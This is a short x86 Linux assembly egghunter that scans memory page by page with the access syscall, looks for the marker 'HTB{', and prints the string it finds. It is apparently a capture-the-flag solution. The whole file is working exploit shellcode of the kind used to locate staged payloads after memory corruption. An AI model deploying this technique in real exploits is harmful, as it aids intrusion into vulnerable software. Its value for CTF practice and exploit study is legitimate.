
global _start


section .text


_start:
    xor eax,eax             ; eax = 0
    mov edi, eax            ; edi = 0
    mov edi, dword 0x7B425448  ; EGG

next_page:
    or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
    inc edx                 ; edx = 4096
    pusha                   ; push all of the current general purposes registers onto the stack
    xor ecx, ecx
    lea ebx, [edx + 0x4]    ; address to be validated for memory violation
    mov al, 0x21            ; access systemcall
    int 0x80
    cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
    popa                    ; get all the registers back
    jz next_page            ; jump to next page if EFAULT occurs
    cmp [edx], edi          ; compare 1st egg
    jnz next_address        ; jump to next address if NOT egg
    
    mov ecx, edx            ; pointer to the string
    xor eax, eax
    mov ebx, eax
    mov edx, ebx
print_flag:
    mov al, 4              ; syscall number for write
    mov bl, 1              ; file descriptor (stdout)
    mov dl, 1              ; length of the string

    int 0x80

    inc ecx
    cmp byte [ecx], dh
    jne print_flag
    ret